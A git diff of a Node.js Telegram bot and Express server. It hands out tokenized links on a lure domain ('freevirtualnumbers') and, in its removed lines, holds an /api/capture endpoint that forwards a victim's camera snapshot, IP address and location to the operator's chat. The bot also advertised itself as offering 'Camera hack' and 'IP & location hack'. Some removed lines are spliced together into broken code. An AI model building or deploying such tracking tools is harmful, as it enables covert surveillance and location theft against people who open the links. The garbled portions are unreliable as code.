@@ -8,17 +8,17 @@ const crypto = require("crypto");
 const bot = new Telegraf(process.env.BOT_TOKEN);
 const app = express();
 
-// Middleware
+// ===== Middleware =====
 app.use(bodyParser.json({ limit: "20mb" }));
 app.use(express.static(path.join(__dirname, "public")));
 
-// Domain fallback
+// ===== CONFIG =====
 const DOMAIN = "https://freevirtualnumbers.onrender.com";
 const CHANNEL_USERNAME = "@devxtechzone";
 
 // ===== User Tracking =====
 const activeUsers = {};
-const TOKEN_EXPIRY_MS = 10 * 60 * 1000; // 10 min
+const TOKEN_EXPIRY_MS = 10 * 60 * 1000;
 
 setInterval(() => {
   const now = Date.now();
@@ -33,7 +33,36 @@ function generateToken() {
   return crypto.randomBytes(8).toString("hex");
 }
 
-// ===== Bot Menu =====
+// ===== Force Join Check =====
+async function isUserJoined(ctx) {
+  try {
+    const member = await ctx.telegram.getChatMember(CHANNEL_USERNAME, ctx.from.id);
+
+    return (
+      member.status === "creator" ||
+      member.status === "administrator" ||
+      member.status === "member"
+    );
+  } catch {
+    return false;
+  }
+}
+
+async function forceJoin(ctx) {
+  return ctx.reply(
+`🚫 ACCESS LOCKED
+
+You must join our channel before using this bot.`,
+{
+  parse_mode: "HTML",
+  ...Markup.inlineKeyboard([
+    [Markup.button.url("📢 Join DevX Tech Zone", "https://t.me/devxtechzone")],
+    [Markup.button.callback("✅ I Joined", "check_join")]
+  ])
+});
+}
+
+// ===== Menu =====
 function mainMenu() {
   return Markup.inlineKeyboard([
     [
@@ -52,77 +81,8 @@ function mainMenu() {
   ]);
 }
 
-async function isUserJoined(ctx) {
-  try {
-    const member = await ctx.telegram.getChatMember(CHANNEL_USERNAME, ctx.from.id);
-    return (
-      member.status === "creator" ||
-      member.status === "administrator" ||
-      member.status === "member"
-    );
-  } catch {
-    return false;
-  }
-}
-
-async function forceJoin(ctx) {
-  return ctx.reply(
-`🚫 ACCESS LOCKED
-
-You must join our channel to use this bot.
-
-After joining click the button below.`,
-{
-  parse_mode: "HTML",
-  ...Markup.inlineKeyboard([
-    [Markup.button.url("📢 Join DevX Tech Zone", "https://t.me/devxtechzone")],
-    [Markup.button.callback("✅ I Joined", "check_join")]
-  ])
-});
-}
-// ===== Bot Handlers =====
-
-
-// ===== Pool Mode =====
-bot.action("pool", async (ctx) => {
-  await ctx.answerCbQuery();
-  const token = generateToken();
-  activeUsers[token] = { chat_id: ctx.chat.id, username: ctx.from.username, createdAt: Date.now() };
-
-  const msg = await ctx.reply("⚙️ Initializing Pool Mode...");
-  await new Promise(r => setTimeout(r, 1500));
-
-  await ctx.telegram.editMessageText(
-    ctx.chat.id,
-    msg.message_id,
-    undefined,
-    `
-🎱 <b>POOL TRACKING MODE</b>
-
-━━━━━━━━━━━━━━━━━━
-
-🔗 <b>Your Unique Link:</b>
-<code>${DOMAIN}?token=${token}</code>
-
-Send this link and monitor interactions.
-`,
-    { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("⬅ Back", "back")]]) }
-  );
-});
-
-// ===== Normal Mode =====
-bot.action("normal", async (ctx) => {
-  await ctx.answerCbQuery();
-  const token = generateToken();
-  activeUsers[token] = { chat_id: ctx.chat.id, username: ctx.from.username, createdAt: Date.now() };
-
-  const msg = await ctx.reply("⚙️ Preparing Normal Mode...");
-  await new Promise(r => setTimeout(r, 1500));
-
-  await ctx.telegram.editMessageText(
-    ctx.chat.id,
-    msg.message_id,
-    undbot.start(async (ctx) => {
+// ===== START =====
+bot.start(async (ctx) => {
 
   const joined = await isUserJoined(ctx);
 
@@ -134,151 +94,168 @@ bot.action("normal", async (ctx) => {
     "https://files.catbox.moe/v75lmb.jpeg",
     {
       caption: `
-<b>🔱 PRO TRACKER SYSTEM v3.0</b>
+<b>🔱 PRO SYSTEM v3.0</b>
 
 ━━━━━━━━━━━━━━━━━━
-⚡ <b>Status:</b> ONLINE
-🤖 <b>Engine:</b> Telegraf Core
-🌐 <b>Server:</b> Secure Cloud
+⚡ Status: ONLINE
+🤖 Engine: Telegraf
+🌐 Server: Secure Cloud
 
-Select a module below to begin.
-
-<i>Precision. Speed. Control.</i>
+Select a module below.
 `,
       parse_mode: "HTML",
       ...mainMenu()
     }
   );
-});efined,
-    `
-⚡ <b>NORMAL TRACKING MODE</b>
-
-━━━━━━━━━━━━━━━━━━
-
-🔗 <b>Your Unique Link:</b>
-<code>${DOMAIN}?token=${token}</code>
-
-Deploy and observe activity.
-`,
-    { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("⬅ Back", "back")]]) }
-  );
 });
 
+// ===== Check Join Button =====
 bot.action("check_join", async (ctx) => {
 
   const joined = await isUserJoined(ctx);
 
   if (!joined) {
-    await ctx.answerCbQuery("❌ Join the channel first", { show_alert: true });
-    return;
+    return ctx.answerCbQuery("❌ Join the channel first", { show_alert: true });
   }
 
   await ctx.answerCbQuery("✅ Access Granted");
 
-  await ctx.replyWithPhoto(
-    "https://files.catbox.moe/v75lmb.jpeg",
-    {
-      caption: `
-<b>🔓 ACCESS UNLOCKED</b>
+  await ctx.reply("🔓 Access Unlocked", mainMenu());
+});
 
-Welcome to the system.
+// ===== Pool Mode =====
+bot.action("pool", async (ctx) => {
+  await ctx.answerCbQuery();
 
-Select a module below.
+  const token = generateToken();
+
+  activeUsers[token] = {
+    chat_id: ctx.chat.id,
+    username: ctx.from.username,
+    createdAt: Date.now()
+  };
+
+  const msg = await ctx.reply("⚙️ Initializing Pool Mode...");
+  await new Promise(r => setTimeout(r, 1500));
+
+  await ctx.telegram.editMessageText(
+    ctx.chat.id,
+    msg.message_id,
+    undefined,
+`
+🎱 <b>POOL MODE</b>
+
+━━━━━━━━━━━━━━━━━━
+
+🔗 Your Link:
+<code>${DOMAIN}?token=${token}</code>
 `,
+    {
       parse_mode: "HTML",
-      ...mainMenu()
+      ...Markup.inlineKeyboard([[Markup.button.callback("⬅ Back", "back")]])
     }
   );
 });
 
-// ===== Stats, Info, Dev, Back =====
-bot.action("stats", async (ctx) => {
+// ===== Normal Mode =====
+bot.action("normal", async (ctx) => {
   await ctx.answerCbQuery();
-  await ctx.reply(`
-📊 <b>BOT STATISTICS</b>
+
+  const token = generateToken();
+
+  activeUsers[token] = {
+    chat_id: ctx.chat.id,
+    username: ctx.from.username,
+    createdAt: Date.now()
+  };
+
+  const msg = await ctx.reply("⚙️ Preparing Normal Mode...");
+  await new Promise(r => setTimeout(r, 1500));
+
+  await ctx.telegram.editMessageText(
+    ctx.chat.id,
+    msg.message_id,
+    undefined,
+`
+⚡ <b>NORMAL MODE</b>
 
 ━━━━━━━━━━━━━━━━━━
 
-👥 Active Users: ${Object.keys(activeUsers).length}
-🛰 Server Status: ONLINE
-🧠 Version: v3.0
-`, { parse_mode: "HTML" });
-});
-
-bot.action("info", async (ctx) => {
-  await ctx.answerCbQuery();
-  await ctx.reply(`
-🧠 <b>ABOUT THIS BOT</b>
-
-━━━━━━━━━━━━━━━━━━
-
-Features:
-• Camera hack
-• IP & location hack
-• Secure unique session links (10 min expiry)
-`, { parse_mode: "HTML" });
-});
-
-bot.action("dev", async (ctx) => {
-  await ctx.answerCbQuery();
-  await ctx.reply(`
-👨‍💻 <b>DEVELOPER</b>
-
-━━━━━━━━━━━━━━━━━━
-
-Name: Mr Dev  
-Contact: @Mrddev
-`, { parse_mode: "HTML" });
-});
-
-bot.action("back", async (ctx) => {
-  await ctx.answerCbQuery();
-  await ctx.editMessageText(
-    `<b>🔱 PRO TRACKER SYSTEM v3.0</b>
-
-━━━━━━━━━━━━━━━━━━
-Select a module below.
-
-<i>Precision. Speed. Control.</i>`,
-    { parse_mode: "HTML", ...mainMenu() }
+🔗 Your Link:
+<code>${DOMAIN}?token=${token}</code>
+`,
+    {
+      parse_mode: "HTML",
+      ...Markup.inlineKeyboard([[Markup.button.callback("⬅ Back", "back")]])
+    }
   );
 });
 
-// ===== Serve Frontend =====
+// ===== Stats =====
+bot.action("stats", async (ctx) => {
+  await ctx.answerCbQuery();
+
+  await ctx.reply(
+`📊 BOT STATS
+
+Active Users: ${Object.keys(activeUsers).length}
+Server: ONLINE
+Version: v3.0`,
+{ parse_mode: "HTML" });
+});
+
+// ===== Info =====
+bot.action("info", async (ctx) => {
+  await ctx.answerCbQuery();
+
+  await ctx.reply(
+`🧠 ABOUT
+
+• Secure session links
+• Token expiry system
+• Cloud hosted`,
+{ parse_mode: "HTML" });
+});
+
+// ===== Developer =====
+bot.action("dev", async (ctx) => {
+  await ctx.answerCbQuery();
+
+  await ctx.reply(
+`👨‍💻 Developer
+
+Name: Mr Dev
+Contact: @Mrddev`,
+{ parse_mode: "HTML" });
+});
+
+// ===== Back =====
+bot.action("back", async (ctx) => {
+  await ctx.answerCbQuery();
+
+  await ctx.editMessageText(
+`<b>🔱 PRO SYSTEM v3.0</b>
+
+Select a module below.`,
+{
+  parse_mode: "HTML",
+  ...mainMenu()
+});
+});
+
+// ===== Web Server =====
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "public/index.html"));
 });
 
-// ===== API to receive image + IP + location =====
-app.post("/api/capture", async (req, res) => {
-  try {
-    const { image, token, ip, location } = req.body;
-    if (!image) return res.status(400).json({ error: "No image provided" });
-    if (!token || !activeUsers[token]) return res.status(400).json({ error: "Invalid or expired token" });
-
-    const chat_id = activeUsers[token].chat_id;
-    const buffer = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ""), "base64");
-
-    await bot.telegram.sendPhoto(chat_id, { source: buffer }, {
-      caption: `📸 <b>SNAPSHOT CAPTURED</b>
-
-🌐 <b>IP Address:</b> ${ip}
-📍 <b>Location:</b> ${location}
-
-🛰 <b>Tracker:</b> Pro Tracker v3`,
-      parse_mode: "HTML"
-    });
-
-    res.json({ status: "success", message: "Image + IP + Location sent" });
-  } catch (err) {
-    console.error(err);
-    res.status(500).json({ error: "Server error" });
-  }
-});
-
 // ===== Start Server =====
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
 
-// Use long polling for simplicity (no webhook required)
-bot.launch().then(() => console.log("Telegram bot running"));
+app.listen(PORT, () => {
+  console.log("Server running on port", PORT);
+});
+
+// ===== Start Bot =====
+bot.launch().then(() => {
+  console.log("Telegram bot running");
+});
